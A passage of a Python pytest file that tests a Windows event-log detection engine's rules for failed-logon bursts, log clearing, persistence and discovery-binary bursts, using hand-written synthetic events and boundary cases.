"""T3.2: every detection rule, positive and benign.

Every fixture here is hand-written: no corpus, no EVTX. Each rule gets at least one positive
test and at least one benign-lookalike test, plus the boundary cases the thresholds imply
(exactly-at-the-window, one-below-the-threshold, one-distinct-binary-short). Nothing here
asserts anything about real data.
"""

from __future__ import annotations

import re
from collections.abc import Sequence
from random import Random

import pytest

from m2.detection.engine import DetectionEngine
from m2.detection.rules import (
    DISCOVERY_BINARIES,
    DISCOVERY_TECHNIQUES,
    DISCOVERY_WINDOW_SECONDS,
    FAILED_LOGON_MIN_EVENTS,
    FAILED_LOGON_WINDOW_SECONDS,
    RULES,
    Rule,
)
from m2.detection.schema import Detection
from m2.query import EventStore
from m2.schema import NormalisedEvent
from m2.tests.synthetic import SECURITY, SYSMON, make_event
from m2.timeutil import TICKS_PER_SECOND, iso_to_ticks, ticks_to_iso

SCENARIO = "SYN-B"
SHA = "D396CE599723189331D440EDD55CC055C28EB4B6AD45A421D07A8E83A2F0EBA7"
BASE = iso_to_ticks("2026-09-21T02:05:30.0000000Z")

WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
EXPLORER = "C:\\Windows\\explorer.exe"
CMD = "C:\\Windows\\System32\\cmd.exe"
POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def at(seconds: int) -> str:
    return ticks_to_iso(BASE + seconds * TICKS_PER_SECOND)


def _event(
    record_id: int,
    event_id: int,
    *,
    seconds: int = 0,
    channel: str = SECURITY,
    user: str | None = "alice",
    host: str | None = "LAB-A",
    event_data: dict[str, str] | None = None,
) -> NormalisedEvent:
    return make_event(
        scenario_id=SCENARIO,
        record_id=record_id,
        event_id=event_id,
        channel=channel,
        timestamp_ticks=BASE + seconds * TICKS_PER_SECOND,
        user=user,
        host=host,
        event_data={} if event_data is None else event_data,
    )


def _auth(record_id: int, event_id: int, seconds: int, *, user: str = "alice", host: str = "LAB-A") -> NormalisedEvent:
    return _event(record_id, event_id, seconds=seconds, user=user, host=host, event_data={"TargetUserName": user})


def _proc(
    record_id: int,
    seconds: int,
    *,
    image: str,
    parent: str = EXPLORER,
    command_line: str | None = None,
    channel: str = SECURITY,
    user: str = "alice",
    host: str = "LAB-A",
) -> NormalisedEvent:
    if channel == SECURITY:
        data = {"NewProcessName": image, "ParentProcessName": parent}
    else:
        data = {"Image": image, "ParentImage": parent, "User": user}
    if command_line is not None:
        data["CommandLine"] = command_line
    return _event(
        record_id,
        4688 if channel == SECURITY else 1,
        seconds=seconds,
        channel=channel,
        user=user,
        host=host,
        event_data=data,
    )


def _sysmon(record_id: int, event_id: int, seconds: int, *, event_data: dict[str, str]) -> NormalisedEvent:
    return _event(record_id, event_id, seconds=seconds, channel=SYSMON, event_data=event_data)


def run_rule(rule_id: str, events: Sequence[NormalisedEvent]) -> tuple[Detection, ...]:
    rule = next(candidate for candidate in RULES if candidate.spec.rule_id == rule_id)
    return rule.fn(tuple(events))


# --- the catalogue itself -----------------------------------------------------------


def test_the_rule_catalogue_is_sorted_unique_and_fully_specified():
    ids = [rule.spec.rule_id for rule in RULES]
    assert ids == sorted(ids)
    assert len(set(ids)) == len(ids)
    assert ids == [
        "R-AUTH-01",
        "R-AUTH-02",
        "R-AUTH-03",
        "R-CRED-01",
        "R-EXEC-01",
        "R-EXEC-02",
        "R-EXEC-03",
        "R-FILE-01",
        "R-LOG-01",
        "R-PERSIST-01",
        "R-PERSIST-02",
        "R-PERSIST-03",
    ]
    # Version 2: the windowed rules moved to a sliding window (phase-3 F1) and the two exec
    # rules gained per-binary / dual ATT&CK attribution (phase-3 F2). Version 3: the two
    # failed-logon rules confirmed a burst against its own span instead of the first greedy window
    # (phase-3 F5). Version 4: the same two rules moved to the T3.2 planner-fixed semantics —
    # R-AUTH-01 anchored on each success, R-AUTH-02 on the failure burst (phase-3 F7).
    # Everything else is v1.
    expected_versions = {
        "R-AUTH-01": "4",
        "R-AUTH-02": "4",
        "R-EXEC-01": "2",
        "R-EXEC-03": "2",
    }
    for rule in RULES:
        assert rule.spec.version == expected_versions.get(rule.spec.rule_id, "1"), rule.spec.rule_id
        assert rule.spec.description
        assert rule.spec.severity in ("low", "medium", "high")
        assert rule.spec.record().rule_id == rule.spec.rule_id
        assert rule.spec.record().params == rule.spec.params


def test_every_rule_is_a_pure_order_independent_function_of_its_events():
    events = ordinary_activity()
    snapshot = list(events)
    for rule in RULES:
        forward = rule.fn(tuple(events))
        assert rule.fn(tuple(reversed(events))) == forward
        assert rule.fn(tuple(events)) == forward
        assert list(events) == snapshot


def ordinary_activity() -> tuple[NormalisedEvent, ...]:
    """A day of nothing suspicious, which no rule may fire on."""
    return (
        _auth(1, 4624, 0),
        _auth(2, 4624, 60, user="bob"),
        _auth(3, 4625, 120, user="carol"),  # one failure is not a burst
        _proc(4, 10, image=EXPLORER),
        _proc(5, 20, image="C:\\Windows\\System32\\svchost.exe"),
        _proc(6, 30, image=CMD, parent=EXPLORER),
        _sysmon(
            7,
            40,
            10,
            event_data={"TargetImage": CMD, "GrantedAccess": "0x001000", "SourceImage": EXPLORER},
        ),
        _sysmon(8, 50, 11, event_data={"TargetFilename": "C:\\Windows\\System32\\driver.dll", "Image": EXPLORER}),
        _sysmon(
            9,
            60,
            13,
            event_data={"TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "EventType": "SetValue"},
        ),
    )


def test_nothing_fires_on_ordinary_activity():
    for rule in RULES:
        assert rule.fn(ordinary_activity()) == (), rule.spec.rule_id


# --- R-AUTH-01 / R-AUTH-02 ---------------------------------------------------------


def test_a_burst_then_success_is_one_high_detection_with_every_trigger():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 30)]
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    detection = detections[0]
    # The detection_id names the closing trigger (the success); see test_two_successes_... below
    # for why the first trigger cannot identify an R-AUTH-01 detection.
    assert detection.detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-4"
    assert detection.trigger_evidence_ids == ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4")
    assert (detection.window_start_utc, detection.window_end_utc) == (at(0), at(30))
    assert (detection.severity, detection.attack_technique) == ("high", "T1110")
    assert "3 failed logons" in detection.rationale


def test_two_failures_then_a_success_is_not_a_burst():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4624, 20)]
    assert run_rule("R-AUTH-01", events) == ()
    assert run_rule("R-AUTH-02", events) == ()


def test_a_burst_split_across_accounts_or_hosts_does_not_fire():
    events = [
        _auth(1, 4625, 0, user="alice"),
        _auth(2, 4625, 5, user="bob"),
        _auth(3, 4625, 10, user="carol"),
        _auth(4, 4624, 20, user="alice"),
        _auth(5, 4625, 25, user="alice", host="LAB-B"),
        _auth(6, 4625, 26, user="alice", host="LAB-C"),
    ]
    assert run_rule("R-AUTH-01", events) == ()
    assert run_rule("R-AUTH-02", events) == ()


def test_a_burst_without_a_success_is_medium_and_uses_only_the_failures():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 21, user="bob")]
    detections = run_rule("R-AUTH-02", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3")
    assert detections[0].severity == "medium"


def test_the_two_failed_logon_rules_partition_a_burst():
    with_success = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 30)]
    without_success = [event for event in with_success if event.source_event_id == 4625]
    assert len(run_rule("R-AUTH-01", with_success)) == 1
    assert run_rule("R-AUTH-02", with_success) == ()
    assert run_rule("R-AUTH-01", without_success) == ()
    assert len(run_rule("R-AUTH-02", without_success)) == 1


def test_a_success_outside_the_burst_window_does_not_confirm_it():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 20 + 301)]
    assert run_rule("R-AUTH-01", events) == ()
    assert len(run_rule("R-AUTH-02", events)) == 1


def test_the_failed_logon_window_includes_its_last_tick_and_no_more():
    inside = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, FAILED_LOGON_WINDOW_SECONDS)]
    assert len(run_rule("R-AUTH-02", inside)) == 1
    outside = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, FAILED_LOGON_WINDOW_SECONDS + 1)]
    assert run_rule("R-AUTH-02", outside) == ()


def test_two_separate_bursts_are_two_detections():
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4625, 600),
        _auth(5, 4625, 610),
        _auth(6, 4625, 620),
    ]
    detections = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3"),
        ("SYN-B-SEC-4", "SYN-B-SEC-5", "SYN-B-SEC-6"),
    ]
    assert len({detection.detection_id for detection in detections}) == 2


def test_a_burst_after_a_lone_early_failure_still_fires():
    # Phase-3 F1: the earlier failure at 0 s sits outside the 250..320 s burst that the 4624 at
    # 330 s confirms (F(S) is measured from the success, so the stray failure is simply not one
    # of its confirming failures). A cluster anchored at 0 s would split the burst and swallow
    # it. (Reviewer's reproduction case.)
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 250),
        _auth(3, 4625, 310),
        _auth(4, 4625, 320),
        _auth(5, 4624, 330),
    ]
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    assert detections[0].detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-5"
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4", "SYN-B-SEC-5")
    assert detections[0].window_start_utc == at(250)
    assert "3 failed logons" in detections[0].rationale
    assert run_rule("R-AUTH-02", events) == ()


def test_a_burst_after_a_lone_early_failure_without_a_success_is_r_auth_02():
    events = [_auth(1, 4625, 0), _auth(2, 4625, 250), _auth(3, 4625, 310), _auth(4, 4625, 320)]
    assert run_rule("R-AUTH-01", events) == ()
    detections = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4")
    ]
    assert detections[0].severity == "medium"


def test_failures_that_never_share_a_window_still_do_not_fire():
    # The benign counterpart of the sliding window: two failures on each side of a gap wider
    # than the window are two pairs, and neither pair is a burst.
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 400), _auth(4, 4625, 410)]
    assert run_rule("R-AUTH-01", events) == ()
    assert run_rule("R-AUTH-02", events) == ()


def test_a_success_that_confirms_a_later_window_of_the_same_run_is_r_auth_01():
    # Phase-3 F5 (the reviewer's first reproduction). Failures at 0, 100, 200, 350 and 360 s with
    # a 4624 at 370 s: F(370) holds 100/200/350/360, all inside one 300 s span, so R-AUTH-01 must
    # fire. Confirming only against the first greedy window (0/100/200) reported this run as
    # R-AUTH-02, whose rationale claimed no success followed it.
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 100),
        _auth(3, 4625, 200),
        _auth(4, 4625, 350),
        _auth(5, 4625, 360),
        _auth(6, 4624, 370),
    ]
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    assert detections[0].detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-6"
    assert detections[0].trigger_evidence_ids == (
        "SYN-B-SEC-2",
        "SYN-B-SEC-3",
        "SYN-B-SEC-4",
        "SYN-B-SEC-5",
        "SYN-B-SEC-6",
    )
    assert (detections[0].window_start_utc, detections[0].window_end_utc) == (at(100), at(370))
    assert "followed by a successful logon" in detections[0].rationale
    assert run_rule("R-AUTH-02", events) == ()


def test_a_sustained_brute_force_that_ends_in_a_success_is_r_auth_01():
    # Phase-3 F5 (the reviewer's second reproduction): failures every 2 s from 0 s to 602 s, then
    # a 4624 at 605 s. The last 300 s span holds hundreds of failures and the success, so
    # R-AUTH-01 must fire however the greedily consumed windows fall on the grid.
    events = [_auth(number + 1, 4625, number * 2) for number in range(302)]
    events.append(_auth(303, 4624, 605))
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    assert detections[0].detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-303"
    assert detections[0].trigger_evidence_ids[-1] == "SYN-B-SEC-303"
    # F(605 s) is the 149 failures in [305 s, 605 s): the span 306..605 s, plus the success.
    assert (detections[0].window_start_utc, detections[0].window_end_utc) == (at(306), at(605))
    assert len(detections[0].trigger_evidence_ids) == 150
    # R-AUTH-02 still reports the earlier part of the run: the failures no 300 s span holds
    # together with the success. The last qualifying burst ends at 304 s, whose span (0, 604 s]
    # stops one second short of the 4624 at 605 s; its trigger set must not overlap R-AUTH-01's.
    unconfirmed = run_rule("R-AUTH-02", events)
    assert [len(detection.trigger_evidence_ids) for detection in unconfirmed] == [153]
    assert unconfirmed[0].trigger_evidence_ids[-1] == "SYN-B-SEC-153"
    assert "inside that same span" in unconfirmed[0].rationale
    confirmed_ids = set(detections[0].trigger_evidence_ids)
    unconfirmed_ids = {evidence_id for detection in unconfirmed for evidence_id in detection.trigger_evidence_ids}
    assert confirmed_ids & unconfirmed_ids == set()


def test_a_success_within_the_window_of_only_two_of_its_failures_does_not_confirm_them():
    # Failures at 0, 100 and 200 s with a success at 310 s. R-AUTH-01 cannot use the success
    # (only 100 and 200 are in [10 s, 310 s)), and R-AUTH-02 declines the burst because a 4624 of
    # the group *is* inside the span the burst opens: (0 s, 200 + 300 s] contains 310 s. So this
    # timeline produces no detection, which T3.2's `(t(first failure), t(last failure) + W]`
    # bound says explicitly. The next test shows the same burst with a success outside the span.
    events = [_auth(1, 4625, 0), _auth(2, 4625, 100), _auth(3, 4625, 200), _auth(4, 4624, 310)]
    assert run_rule("R-AUTH-01", events) == ()
    assert run_rule("R-AUTH-02", events) == ()


def test_a_success_outside_the_burst_span_leaves_the_burst_to_r_auth_02():
    # The benign counterpart of the test above: with the success at 510 s, no 4624 lies in
    # (0 s, 500 s], so the burst is reported as a "no successful logon" finding and the claim
    # its rationale makes is true.
    events = [_auth(1, 4625, 0), _auth(2, 4625, 100), _auth(3, 4625, 200), _auth(4, 4624, 510)]
    assert run_rule("R-AUTH-01", events) == ()
    detections = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3")
    ]
    assert "inside that same span" in detections[0].rationale


def test_a_confirmed_burst_and_an_earlier_unconfirmed_one_partition_their_triggers():
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4625, 500),
        _auth(5, 4625, 510),
        _auth(6, 4625, 520),
        _auth(7, 4624, 530),
    ]
    confirmed = run_rule("R-AUTH-01", events)
    unconfirmed = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in confirmed] == [
        ("SYN-B-SEC-4", "SYN-B-SEC-5", "SYN-B-SEC-6", "SYN-B-SEC-7")
    ]
    assert [detection.trigger_evidence_ids for detection in unconfirmed] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3")
    ]
    triggers = {
        evidence_id
        for detection in (*confirmed, *unconfirmed)
        for evidence_id in detection.trigger_evidence_ids
    }
    assert len(triggers) == 7


def test_a_failure_exactly_one_window_before_the_success_confirms_it():
    # F(S) is half-open at both ends (T3.2): a failure at exactly t(S) - 300 s is inside the span.
    events = [_auth(1, 4625, 0), _auth(2, 4625, 10), _auth(3, 4625, 20), _auth(4, 4624, 300)]
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == (
        "SYN-B-SEC-1",
        "SYN-B-SEC-2",
        "SYN-B-SEC-3",
        "SYN-B-SEC-4",
    )
    assert (detections[0].window_start_utc, detections[0].window_end_utc) == (at(0), at(300))
    assert run_rule("R-AUTH-02", events) == ()


def test_a_failure_at_the_success_tick_is_not_one_of_its_confirming_failures():
    # A 4625 logged in the same 100 ns tick as the 4624 is not strictly before it, so it does not
    # confirm the burst: the detection holds the three earlier failures and the success only.
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4625, 300),
        _auth(5, 4624, 300),
    ]
    detections = run_rule("R-AUTH-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == (
        "SYN-B-SEC-1",
        "SYN-B-SEC-2",
        "SYN-B-SEC-3",
        "SYN-B-SEC-5",
    )
    assert detections[0].detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-5"


def test_the_f7_case_reports_the_success_and_not_the_late_failures():
    # Phase-3 F7, the reviewer's first reproduction: failures at 0, 10 and 20 s, a 4624 at 30 s,
    # then more failures at 40 and 50 s inside the same window. R-AUTH-01 fires on the three
    # failures the success confirms; two late failures are not a burst, and no detection may claim
    # that the pre-success span holds no successful logon.
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4624, 30),
        _auth(5, 4625, 40),
        _auth(6, 4625, 50),
    ]
    detections = run_rule("R-AUTH-01", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4")
    ]
    assert detections[0].detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-4"
    assert "followed by a successful logon" in detections[0].rationale
    assert run_rule("R-AUTH-02", events) == ()


def test_the_f7_case_with_a_third_late_failure_reports_only_those_failures():
    # The same shape with a third late failure. R-AUTH-02 now has a burst, but only the one the
    # success cannot claim: its triggers start after the 4624, and the pre-success failures stay
    # with R-AUTH-01.
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4624, 30),
        _auth(5, 4625, 40),
        _auth(6, 4625, 50),
        _auth(7, 4625, 60),
    ]
    confirmed = run_rule("R-AUTH-01", events)
    unconfirmed = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in confirmed] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4")
    ]
    assert [detection.trigger_evidence_ids for detection in unconfirmed] == [
        ("SYN-B-SEC-5", "SYN-B-SEC-6", "SYN-B-SEC-7")
    ]
    assert "inside that same span" in unconfirmed[0].rationale


def test_the_multi_threaded_shape_reports_the_success_and_the_in_flight_failures():
    # Phase-3 F7, the reviewer's second reproduction: failures every second from 0 s to 19 s with
    # the 4624 at 10 s — the shape a parallel brute-force tool produces, where attempts already in
    # flight are logged after the one that succeeded. R-AUTH-01 confirms on the ten failures
    # before the success; R-AUTH-02 reports the ten failures from the success's tick onwards,
    # whose span (open at its first failure) no successful logon lies in.
    events = [_auth(number + 1, 4625, number) for number in range(20)]
    events.append(_auth(21, 4624, 10))
    confirmed = run_rule("R-AUTH-01", events)
    assert len(confirmed) == 1
    assert confirmed[0].detection_id == "SYN-B-R-AUTH-01-SYN-B-SEC-21"
    assert confirmed[0].trigger_evidence_ids == tuple(
        f"SYN-B-SEC-{number}" for number in range(1, 11)
    ) + ("SYN-B-SEC-21",)
    assert (confirmed[0].window_start_utc, confirmed[0].window_end_utc) == (at(0), at(10))
    unconfirmed = run_rule("R-AUTH-02", events)
    assert [detection.trigger_evidence_ids for detection in unconfirmed] == [
        tuple(f"SYN-B-SEC-{number}" for number in range(11, 21))
    ]
    assert "inside that same span" in unconfirmed[0].rationale
    assert set(confirmed[0].trigger_evidence_ids) & set(unconfirmed[0].trigger_evidence_ids) == set()


def test_two_successes_sharing_a_burst_are_two_detections_with_distinct_ids():
    # T3.2 allows overlapping detections: both successes confirm the same three failures, so the
    # *first* trigger is not unique to a detection. That is why detection_id names the closing
    # trigger (the success). The run is still valid — the engine's fail-closed duplicate check
    # accepts it — and R-AUTH-02 stays silent because a success lies in the burst's span.
    events = [
        _auth(1, 4625, 0),
        _auth(2, 4625, 10),
        _auth(3, 4625, 20),
        _auth(4, 4624, 30),
        _auth(5, 4624, 40),
    ]
    detections = run_rule("R-AUTH-01", events)
    assert [detection.detection_id for detection in detections] == [
        "SYN-B-R-AUTH-01-SYN-B-SEC-4",
        "SYN-B-R-AUTH-01-SYN-B-SEC-5",
    ]
    assert [detection.trigger_evidence_ids for detection in detections] == [
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-4"),
        ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3", "SYN-B-SEC-5"),
    ]
    engine = DetectionEngine(EventStore(events), corpus_manifest_sha256=SHA)
    assert [detection.detection_id for detection in engine.triggers_for(SCENARIO)] == [
        "SYN-B-R-AUTH-01-SYN-B-SEC-4",
        "SYN-B-R-AUTH-01-SYN-B-SEC-5",
    ]
    assert run_rule("R-AUTH-02", events) == ()


def _planner_reference(
    failures: Sequence[NormalisedEvent], successes: Sequence[NormalisedEvent]
) -> tuple[list[tuple[tuple[NormalisedEvent, ...], NormalisedEvent]], list[tuple[NormalisedEvent, ...]]]:
    """A brute-force restatement of task_plan.md T3.2, for cross-checking the rule code.

    The windows are enumerated the long way — every W-window anchored at a failure, then interval
    merging — rather than by the streaming scan the rule uses.
    """
    span = FAILED_LOGON_WINDOW_SECONDS * TICKS_PER_SECOND
    confirmed = []
    for success in successes:
        group = tuple(
            failure
            for failure in failures
            if success.timestamp_ticks - span <= failure.timestamp_ticks < success.timestamp_ticks
        )
        if len(group) >= FAILED_LOGON_MIN_EVENTS:
            confirmed.append((group, success))
    intervals: list[list[int]] = []
    for anchor in range(len(failures)):
        last = anchor
        while last < len(failures) and failures[last].timestamp_ticks - failures[anchor].timestamp_ticks <= span:
            last += 1
        if last - anchor < FAILED_LOGON_MIN_EVENTS:
            continue
        if any(
            failures[anchor].timestamp_ticks < success.timestamp_ticks
            <= failures[last - 1].timestamp_ticks + span
            for success in successes
        ):
            continue
        intervals.append([anchor, last - 1])
    merged: list[list[int]] = []
    for start, end in intervals:
        if merged and start <= merged[-1][1]:
            merged[-1][1] = max(merged[-1][1], end)
        else:
            merged.append([start, end])
    return confirmed, [tuple(failures[start : end + 1]) for start, end in merged]


def test_the_failed_logon_rules_match_a_brute_force_restatement_on_random_timelines():
    # A property-style check after three windowing defects in this rule family (phase-3 F1, F5,
    # F7). For each pseudo-random timeline the rules must reproduce the reference exactly, and the
    # invariants the reviews ask for must hold on every run:
    #   * R-AUTH-01 and R-AUTH-02 never share a trigger;
    #   * no R-AUTH-02 detection has a 4624 inside the span its rationale claims;
    #   * every detection_id in the scenario is unique.
    random = Random(20260922)
    for _ in range(200):
        events = []
        seconds = 0
        for record_id in range(1, random.randint(3, 14)):
            seconds += random.choice((1, 2, 5, 40, 120, 280, 320))
            events.append(_auth(record_id, 4625 if random.random() < 0.7 else 4624, seconds))
        failures = [event for event in events if event.source_event_id == 4625]
        successes = [event for event in events if event.source_event_id == 4624]
        expected_confirmed, expected_bursts = _planner_reference(failures, successes)
        confirmed = run_rule("R-AUTH-01", events)
        unconfirmed = run_rule("R-AUTH-02", events)
        assert sorted(detection.trigger_evidence_ids for detection in confirmed) == sorted(
            tuple(event.evidence_id for event in (*group, success)) for group, success in expected_confirmed
        ), events
        assert sorted(detection.trigger_evidence_ids for detection in unconfirmed) == sorted(
            tuple(event.evidence_id for event in burst) for burst in expected_bursts
        ), events

        confirmed_triggers = {
            evidence_id for detection in confirmed for evidence_id in detection.trigger_evidence_ids
        }
        unconfirmed_triggers = {
            evidence_id for detection in unconfirmed for evidence_id in detection.trigger_evidence_ids
        }
        assert confirmed_triggers & unconfirmed_triggers == set(), events
        for detection in unconfirmed:
            first, last = detection.trigger_evidence_ids[0], detection.trigger_evidence_ids[-1]
            first_ticks = next(event.timestamp_ticks for event in failures if event.evidence_id == first)
            last_ticks = next(event.timestamp_ticks for event in failures if event.evidence_id == last)
            span = FAILED_LOGON_WINDOW_SECONDS * TICKS_PER_SECOND
            assert not any(
                first_ticks < success.timestamp_ticks <= last_ticks + span for success in successes
            ), (detection.detection_id, events)
        ids = [detection.detection_id for detection in (*confirmed, *unconfirmed)]
        assert len(set(ids)) == len(ids), events


# --- R-AUTH-03 ---------------------------------------------------------------------


def test_every_explicit_credential_logon_is_a_low_detection():
    events = [_auth(1, 4648, 0), _auth(2, 4648, 30, user="bob"), _auth(3, 4624, 60)]
    detections = run_rule("R-AUTH-03", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [("SYN-B-SEC-1",), ("SYN-B-SEC-2",)]
    assert {detection.severity for detection in detections} == {"low"}
    assert {detection.attack_technique for detection in detections} == {"T1078"}


def test_an_ordinary_interactive_logon_is_not_an_explicit_credential_logon():
    assert run_rule("R-AUTH-03", [_auth(1, 4624, 0)]) == ()


# --- R-LOG-01 ----------------------------------------------------------------------


def test_a_cleared_audit_log_is_a_high_detection():
    events = [_event(1, 1102, user=None, host="LAB-A", event_data={}), _auth(2, 4624, 5)]
    detections = run_rule("R-LOG-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)
    assert (detections[0].severity, detections[0].attack_technique) == ("high", "T1070.001")


def test_a_normal_event_is_not_a_cleared_audit_log():
    assert run_rule("R-LOG-01", [_auth(1, 4624, 0), _proc(2, 5, image=CMD)]) == ()


# --- R-PERSIST-01 / R-PERSIST-02 ---------------------------------------------------


def test_a_service_install_is_a_medium_detection():
    events = [_event(1, 4697, event_data={"ServiceName": "EvilSvc", "ServiceFileName": "C:\\evil.exe"})]
    detections = run_rule("R-PERSIST-01", events)
    assert len(detections) == 1
    assert "EvilSvc" in detections[0].rationale
    assert detections[0].attack_technique == "T1543.003"


def test_a_service_install_is_not_matched_off_the_security_channel():
    # 7045 is a System-channel ID; this corpus has no System channel, so nothing may match it.
    events = [
        _event(1, 7045, event_data={"ServiceName": "Suspicious"}),
        _event(2, 4698, event_data={"TaskName": "\\Evil"}),
    ]
    assert run_rule("R-PERSIST-01", events) == ()


def test_a_scheduled_task_creation_is_a_medium_detection():
    events = [_event(1, 4698, event_data={"TaskName": "\\Microsoft\\Evil"}), _event(2, 4697, event_data={})]
    detections = run_rule("R-PERSIST-02", events)
    assert len(detections) == 1
    assert detections[0].detection_id == "SYN-B-R-PERSIST-02-SYN-B-SEC-1"
    assert detections[0].attack_technique == "T1053.005"


def test_a_service_install_is_not_a_scheduled_task():
    assert run_rule("R-PERSIST-02", [_event(1, 4697, event_data={})]) == ()


# --- R-PERSIST-03 ------------------------------------------------------------------


def test_a_run_key_value_is_a_medium_detection():
    events = [
        _sysmon(
            1,
            13,
            0,
            event_data={
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "EventType": "SetValue",
            },
        ),
        _sysmon(
            2,
            13,
            5,
            event_data={
                "TargetObject": "HKU\\S-1-5-21-1-2-3-500\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Once",
                "EventType": "SetValue",
            },
        ),
    ]
    detections = run_rule("R-PERSIST-03", events)
    assert [detection.trigger_evidence_ids for detection in detections] == [("SYN-B-SYS-1",), ("SYN-B-SYS-2",)]
    assert {detection.attack_technique for detection in detections} == {"T1547.001"}


def test_a_lookalike_run_key_or_another_registry_event_does_not_fire():
    events = [
        _sysmon(
            1,
            13,
            0,
            event_data={"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\X"},
        ),
        _sysmon(
            2,
            13,
            5,
            event_data={"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunSomething\\X"},
        ),
        _sysmon(
            3,
            13,
            10,
            event_data={"TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Hostname"},
        ),
        _sysmon(
            4,
            11,
            15,
            event_data={"TargetFilename": "C:\\Users\\alice\\AppData\\Local\\Temp\\x.exe"},
        ),
    ]
    assert run_rule("R-PERSIST-03", events) == ()


# --- R-EXEC-01 ---------------------------------------------------------------------


def test_three_distinct_discovery_binaries_in_a_window_are_one_medium_burst():
    events = [
        _proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"),
        _proc(2, 5, image="C:\\Windows\\System32\\net.exe"),
        _proc(3, 10, image="C:\\Windows\\System32\\ipconfig.exe"),
    ]
    detections = run_rule("R-EXEC-01", events)
    assert len(detections) == 1
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1", "SYN-B-SEC-2", "SYN-B-SEC-3")
    assert detections[0].severity == "medium"
    assert "whoami" in detections[0].rationale


def test_a_single_discovery_binary_is_a_low_detection():
    detections = run_rule("R-EXEC-01", [_proc(1, 0, image="C:\\Windows\\System32\\whoami.exe")])
    assert len(detections) == 1
    assert detections[0].severity == "low"
    assert detections[0].trigger_evidence_ids == ("SYN-B-SEC-1",)


def test_two_distinct_binaries_are_not_a_burst():
    events = [_proc(1, 0, image="C:\\Windows\\System32\\whoami.exe"), _proc(2, 5, image="C:\\Windows\\System32\\net.exe")]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low"]


def test_the_same_binary_repeated_is_not_a_burst():
    events = [_proc(record, record * 5, image="C:\\Windows\\System32\\whoami.exe") for record in (1, 2, 3)]
    detections = run_rule("R-EXEC-01", events)
    assert [detection.severity for detection in detections] == ["low", "low", "low"]


def test_a_burst_must_fit_inside_the_window():
